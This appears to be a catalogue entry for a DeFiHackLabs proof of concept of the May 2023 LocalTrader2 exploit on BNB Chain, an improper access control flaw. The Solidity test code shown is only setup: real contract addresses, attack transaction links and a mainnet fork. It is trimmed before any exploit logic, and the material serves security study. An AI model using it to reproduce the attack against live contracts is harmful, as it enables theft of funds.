# [?] LocalTrader2 exploit (2023-05)

## Summary
Severity: Unknown
Chain: BNB Chain
Component: LocalTrader2
Published: 2023-05
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/LocalTrader2_exp.sol
Type: defi-exploit-poc

## Details
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @TX's:
// 1. https://bscscan.com/tx/0x57b589f631f8ff20e2a89a649c4ec2e35be72eaecf155fdfde981c0fec2be5ba
// 2. https://bscscan.com/tx/0xbea605b238c85aabe5edc636219155d8c4879d6b05c48091cf1f7286bd4702ba
// 3. https://bscscan.com/tx/0x49a3038622bf6dc3672b1b7366382a2c513d713e06cb7c91ebb8e256ee300dfb
// 4. https://bscscan.com/tx/0x042b8dc879fa193acc79f55a02c08f276eaf1c4f7c66a33811fce2a4507cea63

// @Summary: Inproper access controll
// @Analysis: https://twitter.com/numencyber/status/1661213691893944320

interface ILCTExchange {
    function buyTokens() external payable;
}

contract LocalTraders is Test {
    ILCTExchange LCTExchange = ILCTExchange(0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20 LCT = IERC20(0x5C65BAdf7F97345B7B92776b22255c973234EfE7);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address public upgradeableProxy = 0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_460_897);
        cheats.label(address(LCTExchange), "LCTExchange");
        cheats.label(address(Router), "Router");
        cheats.label(address(LCT), "LCT");
        cheats.label(address(WBNB), "WBNB");
        cheats.label(upgradeableProxy, "Proxy");
    }

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/LocalTrader2_exp.sol_
